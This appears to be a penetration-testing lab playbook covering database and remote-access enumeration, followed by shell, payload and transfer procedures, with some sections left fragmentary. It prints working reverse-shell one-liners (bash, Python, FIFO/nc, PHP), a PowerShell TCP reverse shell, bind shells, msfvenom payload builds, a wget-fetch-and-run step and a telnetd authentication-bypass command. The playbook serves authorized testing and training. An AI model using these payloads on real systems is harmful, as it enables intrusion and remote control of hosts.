title: 1.2.14 Use SQL Server rights, impersonation and command facilities
text: id="use-sql-server-rights-impersonation-and-command-facilities">1.2.14 Use SQL Server rights, impersonation and command facilities Blocks: 2; authenticated re-enumeration throughout. Operational procedure | Quick sheet <h3

title: 1.2.14.1 Purpose and result
text: id="1-purpose-and-result-9">1.2.14.1 Purpose and result Database data, a more useful SQL security context or verified server command execution. <h3

title: 1.2.14.2 Recognition clues
text: id="2-recognition-clues-9">1.2.14.2 Recognition clues SQL Server credentials or a Windows identity accepted by the database. <h4

title: 1.2.14.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-9">1.2.14.2.1 Find the clue from your starting access Where to investigate: Once SQL Server authentication works, inspect actual login/server role and supported impersonation context. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A confirmed reachable application; anonymous context or one identified credential Requires: Correct SQL versus Windows authentication; database role and configuration must permit the requested operation Action class: Service queries; optional file-write or execution variants can change target state. Stop/verify: Verify SQL identity and any OS effect with hostname/whoami; record service/proxy execution identity. Failure/next check: Login success with denied configuration changes is a rights boundary. Do not repeatedly enable an unavailable facility. SELECT SYSTEM_USER, ORIGINAL_LOGIN(), @@VERSION; SELECT IS_SRVROLEMEMBER('sysadmin'); Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. SYSTEM_USER: DOMAIN\USER ORIGINAL_LOGIN: DOMAIN\USER IS_SRVROLEMEMBER: 0 Recognize this detail: A valid login with sysadmin=0 is data/rights evidence, not permission to enable xp_cmdshell. Still missing before method selection: Enumerate actual database/server grants and useful impersonation; independently verify any OS facility and its identity. Outcome after checking Example and next decision Enabled after validation Required role/configuration and OS effect are verified: use the supported database-to-command method. Ruled out in this context No facility/impersonation right rules out that proposed OS chain while readable data may remain. Inconclusive A failed role query or unknown proxy context needs a narrower rights check. If you do not yet have this clue: start with Identify applications and validate selected NSE checks . <h3

title: 1.2.14.3 Prerequisites
text: id="3-prerequisites-9">1.2.14.3 Prerequisites Starting access: A confirmed reachable application; anonymous context or one identified credential. Required conditions: Correct SQL versus Windows authentication; database role and configuration must permit the requested operation. <h3

title: 1.2.14.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-9">1.2.14.4 Discover and verify prerequisites SELECT SYSTEM_USER, ORIGINAL_LOGIN(), @@VERSION; SELECT IS_SRVROLEMEMBER('sysadmin'); <h3

title: 1.2.14.5 Why it works
text: id="5-why-it-works-9">1.2.14.5 Why it works SQL login, sysadmin/impersonation rights and xp_cmdshell configuration are separate conditions. OS commands run under the SQL service or configured proxy context, not automatically as domain administrator. <h3

title: 1.2.14.6 Execute and choose variants
text: id="6-execute-and-choose-variants-9">1.2.14.6 Execute and choose variants impacket-mssqlclient 'USER@TARGET' impacket-mssqlclient 'DOMAIN/USER@TARGET' -windows-auth Let the tool prompt for the password. At the SQL prompt: SELECT @@VERSION; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin'); SELECT name FROM sys.databases; USE DATABASE; SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES; SELECT TOP 20 * FROM SCHEMA.TABLE; Interpret: IS_SRVROLEMEMBER('sysadmin') returns 1 , 0 or NULL ; NULL is not success. Impacket also exposes helpers such as enum_impersonate and xp_cmdshell depending on version and rights. <summary

title: 1.2.14.6.1 MSSQL variant — command-execution boundary
text: id="variant-1-2-14-6-1">1.2.14.6.1 MSSQL variant — command-execution boundary EXEC xp_cmdshell 'whoami'; xp_cmdshell is disabled by default on new installations. Enabling it generally requires high privilege and changes server configuration; do not enable it merely to enumerate. When available, a sysadmin's child process normally runs as the SQL Server service account; an authorized non-sysadmin may use a configured proxy. Verify returned identity before choosing the next action. <h3

title: 1.2.14.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical-9">1.2.14.7 Worked example — hypothetical Observation: Windows authentication succeeds to SQL Server. Test: inspect role and allowed impersonation. Illustrative output: only a low-privilege database user. Interpretation: enumerate permitted data and relationships before proposing xp_cmdshell. <h3

title: 1.2.14.8 Verify the result
text: id="8-verify-the-result-9">1.2.14.8 Verify the result Verify SQL identity and any OS effect with hostname/whoami; record service/proxy execution identity. <h3

title: 1.2.14.9 Failure and fallback
text: id="9-failure-and-fallback-9">1.2.14.9 Failure and fallback Login success with denied configuration changes is a rights boundary. Do not repeatedly enable an unavailable facility. <h3

title: 1.2.15.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-10">1.2.15.2.1 Find the clue from your starting access Where to investigate: Authenticate to the observed database and inspect current/session identity and role attributes before program/file functions. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A confirmed reachable application; anonymous context or one identified credential Requires: Accepted connection/database role; COPY PROGRAM needs the corresponding server privilege and an executable OS context Action class: Service queries; optional file-write or execution variants can change target state. Stop/verify: Separate returned rows, file operations and command execution; prove the actual operating-system identity for the latter. Failure/next check: Role or OS permission failures require another allowed primitive, not a different spelling of the same denied operation. SELECT current_user,session_user,version(); SELECT rolname,rolsuper FROM pg_roles WHERE rolname=current_user; Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. current_user | session_user APP_USER | APP_USER rolname | rolsuper APP_USER | f Recognize this detail: An ordinary database role does not automatically have COPY PROGRAM or server-file access. Still missing before method selection: Inspect effective role memberships and exact operation rights, then the database service's OS context. Outcome after checking Example and next decision Enabled after validation The needed execution/file role and a usable consumer are established: select that documented operation. Ruled out in this context No superuser or required operation-specific privilege rules out the proposed program-execution route. Inconclusive Unknown inherited role rights leave the operation unresolved; enumerate memberships before deciding. If you do not yet have this clue: start with Identify applications and validate selected NSE checks . <h3

title: 1.2.15.5 Why it works
text: id="5-why-it-works-10">1.2.15.5 Why it works SQL access does not imply server superuser. File/program functions execute as the database service and are gated by database roles and OS permissions. <h3

title: 1.2.15.6 Execute and choose variants
text: id="6-execute-and-choose-variants-10">1.2.15.6 Execute and choose variants psql -h TARGET -p PORT -U USER -d postgres \conninfo \l \du \dn \dt *.* SELECT version(), current_user, session_user; SELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles; <summary

title: 1.2.15.6.1 PostgreSQL variant — server file/program privilege boundary
text: id="variant-1-2-15-6-1">1.2.15.6.1 PostgreSQL variant — server file/program privilege boundary SELECT pg_has_role(current_user, 'pg_read_server_files', 'member'); SELECT pg_has_role(current_user, 'pg_write_server_files', 'member'); SELECT pg_has_role(current_user, 'pg_execute_server_program', 'member'); Server-side COPY ... FROM/TO 'file' uses the PostgreSQL server's filesystem and service identity. COPY ... PROGRAM executes on the server and requires superuser or the corresponding predefined role. Client-side \copy reads/writes the client filesystem and is not the same primitive. Failure cues: connection refusal/timeout is network or listener context; login rejection is authentication/context; an empty database list may be visibility limits; object denial is authorization. Query only bounded rows first. Never assume that reading application credentials or obtaining database admin implies OS execution. Next action: identify application accounts, hashes/credentials, paths and linked systems; record the precise grant enabling any file or execution primitive; validate recovered credentials in the later credential block and re-enumerate after any identity change. <h3

title: 1.2.15.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical-10">1.2.15.7 Worked example — hypothetical Observation: a database role can read application tables. Test: inspect role attributes. Illustrative output: rolsuper is false and program-execution rights are absent. Interpretation: recover useful data without treating SQL access as a shell. <h3

title: 1.2.16.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-11">1.2.16.2.1 Find the clue from your starting access Where to investigate: Identify Redis and use its authentication context to distinguish accepted commands from denied administrative facilities. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A confirmed reachable application; anonymous context or one identified credential Requires: Reachability and accepted authentication/ACL commands; persistence writes need CONFIG rights, destination permissions and a consumer Action class: Service queries; optional file-write or execution variants can change target state. Stop/verify: Verify authentication context, allowed commands and actual key/file effects without assuming old Redis exploit defaults. Failure/next check: NOAUTH and NOPERM identify different boundaries. Investigate credentials or permitted data rather than assuming unauthenticated execution. redis-cli -h TARGET -p PORT PING Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. PONG Administrative operation: NOPERM this user has no permissions Recognize this detail: The connection is usable but command ACLs can remove persistence/configuration methods. Still missing before method selection: Inspect allowed operations, data visibility and actual persistence/destination/consumer conditions. Outcome after checking Example and next decision Enabled after validation Useful keys are readable or a fully permitted file-consumer chain exists: select that bounded capability. Ruled out in this context CONFIG denied rules out the familiar configuration-backed file-write route under this identity. Inconclusive PING alone leaves key and administrative rights unknown; inspect the selected permitted command. If you do not yet have this clue: start with Identify applications and validate selected NSE checks . <h3

title: 1.2.16.3 Prerequisites
text: id="3-prerequisites-11">1.2.16.3 Prerequisites Starting access: A confirmed reachable application; anonymous context or one identified credential. Required conditions: Reachability and accepted authentication/ACL commands; persistence writes need CONFIG rights, destination permissions and a consumer. <h3

title: 1.2.16.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-11">1.2.16.4 Discover and verify prerequisites redis-cli -h TARGET -p PORT PING <h3

title: 1.2.16.5 Why it works
text: id="5-why-it-works-11">1.2.16.5 Why it works Redis keys may disclose sessions or secrets. Historical file-write chains depend on command permissions, persistence format and a writable useful path; an open port alone proves none of them. <h3

title: 1.2.16.6 Execute and choose variants
text: id="6-execute-and-choose-variants-11">1.2.16.6 Execute and choose variants nmap -Pn -sV --script redis-info -p PORT TARGET redis-cli -h TARGET -p PORT PING redis-cli -h TARGET -p PORT INFO redis-cli -h TARGET -p PORT ACL WHOAMI redis-cli -h TARGET -p PORT ACL LIST Authenticated when a password is legitimately known: redis-cli -h TARGET -p PORT --askpass PONG proves an accessible Redis command surface, not write/file/execution permission. Check ACLs, mode, bind/protected-mode and persistence/module configuration before reasoning about an effect. Do not run CONFIG SET , write keys or load modules during enumeration. <h3

text: id="7-worked-example--hypothetical-11">1.2.16.7 Worked example — hypothetical Observation: PING returns PONG but CONFIG is denied. Test: inspect allowed data access. Illustrative output: only application keys are readable. Interpretation: investigate session/credential value while rejecting a presumed arbitrary-file-write chain. <h3

title: 1.2.17.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-12">1.2.17.2.1 Find the clue from your starting access Where to investigate: Use service discovery and an application's connection descriptor to distinguish listener identification from a valid database session. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A confirmed reachable application; anonymous context or one identified credential Requires: Correct service/SID, reachable database transport and valid database credentials for authenticated work Action class: Service queries; optional file-write or execution variants can change target state. Stop/verify: Distinguish listener identification, database login and a permitted SQL action. Failure/next check: An invalid service descriptor is different from an invalid password; resolve it before further credential decisions. nmap -Pn -sV -p 1521 TARGET Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. 1521/tcp open oracle-tns Oracle TNS Listener Application descriptor: SERVICE_NAME Recognize this detail: Listener/product evidence and a service name establish a connection candidate, not database credentials or DBA rights. Still missing before method selection: Validate the exact descriptor/account and inspect its permitted database action. Outcome after checking Example and next decision Enabled after validation The selected account logs in and grants a useful operation: enumerate within that role. Ruled out in this context The descriptor names a nonexistent service: reject that connection string before judging passwords. Inconclusive An unidentified listener version or authentication error needs descriptor/account separation. If you do not yet have this clue: start with Identify applications and validate selected NSE checks . <h3

title: 1.2.17.3 Prerequisites
text: id="3-prerequisites-12">1.2.17.3 Prerequisites Starting access: A confirmed reachable application; anonymous context or one identified credential. Required conditions: Correct service/SID, reachable database transport and valid database credentials for authenticated work. <h3

title: 1.2.17.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-12">1.2.17.4 Discover and verify prerequisites nmap -Pn -sV -p 1521 TARGET <h3

title: 1.2.17.5 Why it works
text: id="5-why-it-works-12">1.2.17.5 Why it works A TNS listener is a connection broker; knowing its version or service name does not establish database authentication or DBA rights. <h3

title: 1.2.17.6 Execute and choose variants
text: id="6-execute-and-choose-variants-12">1.2.17.6 Execute and choose variants nmap -Pn -sV --script oracle-tns-version -p 1521 TARGET nmap -Pn --script oracle-sid-brute -p 1521 TARGET A discovered SID/service name is a namespace clue, not credentials. Continue with an installed Oracle client only when a legitimate identity is available; preserve listener/version/SID evidence and do not treat a conventional port as Oracle proof. Source supplement: reviewed getSH Nmap Oracle block. <h3

Illustrative output: listener identification succeeds but database authentication fails. Interpretation: retain the service clue and seek the correct account/descriptor. <h3

text: id="validate-rdp-winrm-vnc-and-telnet-access-contexts">1.2.18 Validate RDP, WinRM, VNC and Telnet access contexts Blocks: 2; authenticated re-enumeration throughout. Operational procedure | Quick sheet <h3

title: 1.2.18.1 Purpose and result
text: id="1-purpose-and-result-13">1.2.18.1 Purpose and result A verified remote session or a precise authentication/authorization failure. <h3

title: 1.2.18.2 Recognition clues
text: id="2-recognition-clues-13">1.2.18.2 Recognition clues An exposed remote-access application and compatible known credentials. <h4

title: 1.2.18.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-13">1.2.18.2.1 Find the clue from your starting access Where to investigate: Take remote-access listeners from discovery and validate one known identity against the specific endpoint/logon type. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A confirmed reachable application; anonymous context or one identified credential Requires: Enabled destination service, matching authentication and protocol-specific logon/session rights Action class: Service queries; optional file-write or execution variants can change target state. Stop/verify: Verify destination hostname, represented identity and usable effect in the resulting session. Failure/next check: A valid password is not proof of RDP/WinRM rights. Diagnose TLS, transport, account qualification and logon policy separately. Test-NetConnection TARGET -Port 3389 Test-NetConnection TARGET -Port 5985 Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. RemotePort : 3389; TcpTestSucceeded : True RemotePort : 5985; TcpTestSucceeded : False Recognize this detail: Transport offers an RDP candidate from this source; it does not establish remote-interactive rights. Still missing before method selection: Check actual protocol, local/domain context, accepted authentication and endpoint/logon authorization. Outcome after checking Example and next decision Enabled after validation The intended remote session opens and its identity is verified: enumerate the new host context. Ruled out in this context A known-valid identity lacks that logon right: reject this access form for the account. Inconclusive A timeout cannot distinguish host firewall, route or absent service; verify the failed layer. If you do not yet have this clue: start with Identify applications and validate selected NSE checks . <h3

title: 1.2.18.3 Prerequisites
text: id="3-prerequisites-13">1.2.18.3 Prerequisites Starting access: A confirmed reachable application; anonymous context or one identified credential. Required conditions: Enabled destination service, matching authentication and protocol-specific logon/session rights. <h3

title: 1.2.18.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-13">1.2.18.4 Discover and verify prerequisites Test-NetConnection TARGET -Port 3389 Test-NetConnection TARGET -Port 5985 <h3

title: 1.2.18.5 Why it works
text: id="5-why-it-works-13">1.2.18.5 Why it works Remote interactive logon and remote management are different rights. VNC may use its own password; Telnet may expose a different account context from Windows/domain authentication. <h3

title: 1.2.18.6 Execute and choose variants
text: id="6-execute-and-choose-variants-13">1.2.18.6 Execute and choose variants Recognize: RDP commonly uses TCP/3389; WinRM commonly uses 5985/HTTP and 5986/HTTPS. Goal: determine whether one known credential is accepted in the correct local/domain context and whether it is authorized for a usable session. <h5

title: 1.2.18.6.1.1 RDP baseline: authentication-only check
text: id="rdp-baseline-authentication-only-check">1.2.18.6.1.1 RDP baseline: authentication-only check xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /auth-only /cert:ignore Some distributions expose the binary as xfreerdp . Omit /d:DOMAIN for the intended local-account context; use /u:TARGET\\USER if needed to make that context explicit. Decisive output: successful authentication-only validation supports that the credential is accepted for RDP/NLA. It does not prove an interactive desktop will be granted under every policy/session condition. <summary

title: 1.2.18.6.1.1.1 Variant — open an RDP desktop
text: id="variant-1-2-18-6-1-1-1">1.2.18.6.1.1.1 Variant — open an RDP desktop xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /dynamic-resolution /cert:ignore Let FreeRDP prompt for the password. /cert:ignore suppresses certificate validation and is suitable only in the controlled lab context; it removes server-identity protection. <summary

title: 1.2.18.6.1.1.2 Variant — identify RDP security requirements
text: id="variant-1-2-18-6-1-1-2">1.2.18.6.1.1.2 Variant — identify RDP security requirements nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info TARGET This can disclose supported security layers, NLA and NTLM host/domain clues. It does not validate a credential. <h5

title: 1.2.18.6.1.2 WinRM baseline: interactive session
text: id="winrm-baseline-interactive-session">1.2.18.6.1.2 WinRM baseline: interactive session evil-winrm -i TARGET -u USER evil-winrm -i TARGET -u 'DOMAIN\\USER' Omitting -p makes the established Ruby client prompt for the password. Decisive output: an interactive PowerShell prompt establishes WinRM authorization. Immediately verify identity and host context with whoami , hostname and Get-NetIPAddress . <summary

title: 1.2.18.6.1.2.1 Variant — WinRM over HTTPS
text: id="variant-1-2-18-6-1-2-1">1.2.18.6.1.2.1 Variant — WinRM over HTTPS evil-winrm -i TARGET -u USER -S -P 5986 Check evil-winrm -h because the established Ruby client and newer evil-winrm-py use different long-option spelling. Do not assume a copied command matches the installed implementation. <summary

title: 1.2.18.6.1.2.2 Variant — Windows PowerShell remoting
text: id="variant-1-2-18-6-1-2-2">1.2.18.6.1.2.2 Variant — Windows PowerShell remoting $cred = Get-Credential Enter-PSSession -ComputerName TARGET -Credential $cred PowerShell remoting uses the configured WinRM endpoint. Local trusted-host, Kerberos/name-resolution and endpoint authorization settings can fail independently of password validity. Failure cues: certificate warnings are different from authentication failure. RDP errors can reflect NLA, account context, expired/locked accounts or missing logon rights. WinRM 401 supports authentication/authorization failure; WinRM cannot process the request can be name resolution, trusted-host, listener or transport context. Valid SMB credentials do not guarantee RDP or WinRM rights. Next action: after a session, re-enumerate identity, groups, privileges, files, local services/listeners and routes. Password spraying, pass-the-hash and ticket use belong to later credential/AD blocks. <h5

title: 1.2.18.6.1.3 VNC
text: id="vnc">1.2.18.6.1.3 VNC nmap -Pn -sV --script vnc-info -p PORT TARGET vncviewer TARGET:PORT VNC may expose a desktop without Windows logon semantics; the VNC server's authentication and the resulting OS session identity are separate. Use realvnc-auth-bypass or password testing only for a confirmed compatible product and explicit authorized objective, then verify the desktop identity. <h5

title: 1.2.18.6.1.4 Telnet
text: id="telnet">1.2.18.6.1.4 Telnet nmap -Pn -sV -p PORT TARGET nc -nv TARGET PORT telnet TARGET PORT Telnet is plaintext and may expose a banner/login prompt. Validate only legitimately acquired credentials; do not make telnet-brute a baseline. After login, verify host and identity because appliance/application shells can differ from an OS shell. Source supplement: reviewed getSH Nmap VNC/Telnet blocks. <h5

title: 1.2.18.6.1.5 GNU Inetutils telnetd — conditional authentication-bypass check
text: id="gnu-inetutils-telnetd--conditional-authentication-bypass-check">1.2.18.6.1.5 GNU Inetutils telnetd — conditional authentication-bypass check Use only after identifying the affected GNU Inetutils telnetd/login chain and its patch status. CVE-2026-24061 concerns how a supplied USER value reaches login; it does not apply to every Telnet server. Distribution backports matter. # Client supports sending the autologin USER environment value USER='-f root' telnet -a TARGET PORT Read: if a shell is obtained, verify hostname and id. A prompt or echoed username is not root access. A different daemon, fixed build, client negotiation mismatch or a rejected USER value → return to service identification. The affected upstream range and distribution fixes must be checked against the advisory rather than inferred from port 23. Sources: upstream 1 . <h3

title: 1.2.18.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical-13">1.2.18.7 Worked example — hypothetical Observation: SMB accepts a credential but RDP rejects it. Test: separate the RDP service and logon-right checks. Illustrative output: the account lacks remote-interactive authorization. Interpretation: test a justified WinRM or SMB execution path instead. <h3

title: 1.2.18.8 Verify the result
text: id="8-verify-the-result-13">1.2.18.8 Verify the result Verify destination hostname, represented identity and usable effect in the resulting session. <h3

title: 1.2.18.9 Failure and fallback
text: id="9-failure-and-fallback-13">1.2.18.9 Failure and fallback A valid password is not proof of RDP/WinRM rights. Diagnose TLS, transport, account qualification and logon policy separately. <h3

title: 4.2.1.1 Verify the host and command identity
text: id="verify-the-host-and-command-identity">4.2.1.1 Verify the host and command identity A single response is not necessarily a stable session. Record the actual destination and output channel. hostname id pwd ip addr ip route If Commands execute as the expected target identity: Choose the available callback direction and interpreter. → Connect a Linux reverse shell through an available interpreter . If Callback cannot reach the listener: Inspect the actual initiator, destination and route. → Diagnose connection direction, listener and session failures in order . Otherwise: Output cannot be attributed to the destination: repeat the host/identity proof. → Verify command execution, host and represented identity . <h3

title: 4.2.1.2 Transfer a reviewed tool through a reachable route
text: id="transfer-a-reviewed-tool-through-a-reachable-route">4.2.1.2 Transfer a reviewed tool through a reachable route Serve from the attacker and download on the target only when that direction is reachable. Verify the received artifact. wget http://LHOST:8000/linpeas.sh -O /tmp/linpeas.sh chmod +x /tmp/linpeas.sh /tmp/linpeas.sh | tee /tmp/linpeas.txt If The verified Linux enumerator is present: Run the LinPEAS baseline and inspect its findings. → Use enumeration tools to generate manually testable candidates . If HTTP is unavailable but SSH file access works: Use SCP instead of forcing the same failing transport. → Copy files through an authenticated SSH service . If SMB is the usable authenticated channel: Use the SMB transfer procedure in that identity. → Move Windows files through an authenticated SMB share . Otherwise: Bytes differ or the file is missing: fix transfer before interpreting execution errors. → Match an artifact to its executable consumer and runtime . <h2

title: 4.2.2 Discovery workflow
text: id="discovery-workflow">4.2.2 Discovery workflow Start with a claimed effect, command primitive or accepted remote identity; a usable shell and return path remain unproved. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. Verify destination, execution identity and the actual output channel: Verify command execution, host and represented identity . Inspect interpreters and both connection directions before choosing reverse, bind or native access: Connect a Linux reverse shell through an available interpreter ; Use a bind shell when the target can accept inbound connections ; Use Windows authenticated access or a PowerShell command channel . Match artifact/handler and terminal requirements to the selected consumer: Generate a payload matching OS, process, format and handler ; Repair a limited Linux terminal . Select a transfer route by available client, authentication and direction, then verify bytes: Transfer over HTTP using Linux or Windows clients ; Copy files through an authenticated SSH service ; Move Windows files through an authenticated SMB share ; Move a small artifact through a text-only channel . Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive . <h2

Payload and terminal compatibility: Generate a payload matching OS, process, format and handler , Repair a limited Linux terminal . File transport and integrity: Transfer over HTTP using Linux or Windows clients , Copy files through an authenticated SSH service , Move Windows files through an authenticated SMB share , Stream a file over a direct TCP connection , Move a small artifact through a text-only channel , Use a temporary FTP transfer as a constrained fallback . <h2

title: 4.2.5.6 Execute and choose variants
text: id="6-execute-and-choose-variants">4.2.5.6 Execute and choose variants delivery → execution → connection → usable session State Decisive evidence Does not yet prove Delivery Exact bytes/request reached intended consumer Payload executed Execution Harmless command output or controlled side effect Network callback works Connection Listener records the expected peer Commands and I/O are usable Session Commands return and host/identity are verified Higher privilege or stability Do not change all four layers at once. Preserve the last confirmed state and test the next boundary. Situation Prefer Main prerequisite / limitation One bounded action is enough Direct command execution Observable output or side effect; no shell required Valid credential and remote service SSH, WinRM or RDP Authentication plus remote-logon authorization Target can reach Kali Reverse shell Target egress and a reachable Kali listener Kali can reach a target listener Bind shell Target can bind and inbound path permits it Payload is staged or protocol-aware Matching framework handler Handler must use the exact payload/transport Prefer authenticated administrative access when it is already available: it is normally more stable, auditable and feature-complete than an improvised shell. Linux: id; hostname; pwd Windows: whoami & hostname & cd For blind execution, use one bounded callback or file side effect that the current context can produce and you can independently observe. Do not interpret a hung HTTP request as proof of a shell; the server may simply be waiting on a child process or timeout. Linux: hostname; id; pwd ip addr; ip route ss -lntup Windows: hostname whoami /all cd ipconfig /all route print netstat -ano Record the destination host, actual identity, privilege, current directory, interfaces/routes, parent/execution context and the exact command that produced the session. Then re-enumerate from the new state. exact prerequisites → exploit reaches expected vulnerable path → bounded harmless effect or identity output → repeatable command execution → payload reaches listener → usable session → verified host/identity/privilege/network position Do not accept the exploit's own “success” string as proof. Validate an independent effect. An HTTP 200 , uploaded filename, connection or application crash each proves less than a verified command result. <h3

title: 4.2.6.6 Execute and choose variants
text: id="6-execute-and-choose-variants-1">4.2.6.6 Execute and choose variants trigger context → target process/interpreter and architecture → target source interface → route/egress controls → LHOST address visible from target → LPORT → local bind interface → listener/handler Select LHOST from the target's point of view. A VPN address, tunnel endpoint or reachable interface may be correct while Kali's default-route address is wrong. On Kali: ip -brief address ip route ss -lntp Windows source/listener checks: Get-NetIPAddress -AddressFamily IPv4 Get-NetRoute -AddressFamily IPv4 Get-NetTCPConnection -State Listen Traditional/OpenBSD-style nc commonly used on Kali: rlwrap nc -lvnp LPORT Nmap Ncat uses a positional listen port; do not mechanically copy every nc flag: ncat -4 -lvn 0.0.0.0 LPORT Verify the bind in another terminal: ss -lntp | grep ':LPORT' If multiple interfaces exist, bind deliberately: ncat -4 -lvn LHOST LPORT Failure cue: a listener bound only to 127.0.0.1 , the wrong VPN/interface address or the wrong address family cannot receive the expected callback. “Address already in use” means another process owns the bind. Choose an interpreter that you confirmed exists. Bash TCP: bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' Python 3 with a PTY: python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")' Portable FIFO plus Netcat when -e is absent: rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT >/tmp/f PHP CLI: php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");' <summary

title: 4.2.6.6.1 Variant — target has Ncat command execution
text: id="variant-4-2-6-6-1">4.2.6.6.1 Variant — target has Ncat command execution Linux: ncat LHOST LPORT --exec /bin/sh Windows: ncat.exe LHOST LPORT --exec cmd.exe --exec exposes the named program directly to the network connection. Use only on the assigned host and remove transferred tooling when the exercise requires cleanup. Shell-language cue: a command injection may execute through /bin/sh , which does not understand every Bash construct. Wrap Bash-specific syntax in bash -c '...' and then encode it for the outer HTTP/template/database layer. <h3

text: id="4-discover-and-verify-prerequisites-2">4.2.7.4 Discover and verify prerequisites hostname whoami /all $PSVersionTable $ExecutionContext.SessionState.LanguageMode <h3

title: 4.2.7.5 Why it works
text: id="5-why-it-works-2">4.2.7.5 Why it works Authenticated WinRM/RDP/SSH can be simpler than an injected callback. A basic PowerShell TCP loop is a command stream rather than a full terminal; encoding fixes parser transport, not authorization or endpoint controls. <h3

title: 4.2.7.6 Execute and choose variants
text: id="6-execute-and-choose-variants-2">4.2.7.6 Execute and choose variants Prefer an available authenticated service: evil-winrm -i TARGET -u USER -p 'PASSWORD' xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore ssh -p PORT USER@TARGET PowerShell TCP shell when direct command execution is the only primitive: $client = [Net.Sockets.TcpClient]::new('LHOST',LPORT) $stream = $client.GetStream() $buffer = New-Object byte[] 65535 while (($count = $stream.Read($buffer,0,$buffer.Length)) -gt 0) { $command = [Text.Encoding]::ASCII.GetString($buffer,0,$count) $output = (Invoke-Expression $command 2>&1 | Out-String) + "PS $((Get-Location).Path)> " $bytes = [Text.Encoding]::ASCII.GetBytes($output) $stream.Write($bytes,0,$bytes.Length) $stream.Flush() } $client.Close() This is a basic command channel, not a ConPTY. Host policy, language mode, AMSI/antimalware, quoting and the parent process can affect it. PowerShell -EncodedCommand solves nested quoting; it is not encryption or an AV bypass. Generate UTF-16LE Base64 locally: $command = 'COMMAND' $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command)) $encoded Invoke in the target command context: powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE <h3

Interpretation: enumerate that token rather than assume an interactive administrator session. <h3

Stop/verify: Verify reachable listener plus hostname/id over the channel; record and later remove the created listener. Failure/next check: A target-side listener with client timeout implies a route/firewall boundary. Use an appropriate forward or another allowed access form. nc -h ss -lnt Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Netcat help: no -e option Selected listen port: not currently bound Recognize this detail: The implementation cannot use an assumed -e shell; another supported listener mechanism is needed. Still missing before method selection: Confirm a compatible bind command, permitted listener and inbound source-to-target reachability. Outcome after checking Example and next decision Enabled after validation The selected implementation binds and the source reaches it: use the verified inbound channel. title: 4.2.8.6 Execute and choose variants
text: id="6-execute-and-choose-variants-3">4.2.8.6 Execute and choose variants Use a bind shell only when Kali can reach a target listener and reverse egress is unavailable. Traditional Netcat with -e support on a Linux target: nc -lvnp PORT -e /bin/sh Connect from Kali: nc -nv TARGET PORT FIFO alternative when -e is absent: rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp PORT >/tmp/f Ncat target listener: ncat -4 -lvn 0.0.0.0 PORT --exec /bin/sh Bind shells expose a target port and may be blocked by the host firewall or upstream ACL. A successful local bind does not prove Kali can reach it. <h3

title: 4.2.9.4 Discover and verify prerequisites

title: 4.2.9.5 Why it works
text: id="5-why-it-works-4">4.2.9.5 Why it works An ELF, PE, script and raw shellcode serve different consumers. A staged payload requires another transfer and a matching handler; Netcat may receive a stage request without producing a shell. <h3

title: 4.2.9.6 Execute and choose variants
text: id="6-execute-and-choose-variants-4">4.2.9.6 Execute and choose variants List rather than guess names and formats: msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86' msfvenom --list formats msfvenom -p PAYLOAD_NAME --list-options Stageless command-shell binaries: msfvenom -p linux/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f elf -o shell.elf msfvenom -p windows/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f exe -o shell.exe Verify the resulting artifacts: file shell.elf shell.exe sha256sum shell.elf shell.exe msfvenom does not make a payload compatible with the delivery path. Match target OS, process architecture, payload type, output format, available execution method and callback route. <h5

title: 4.2.9.6.1.1 Staged versus stageless
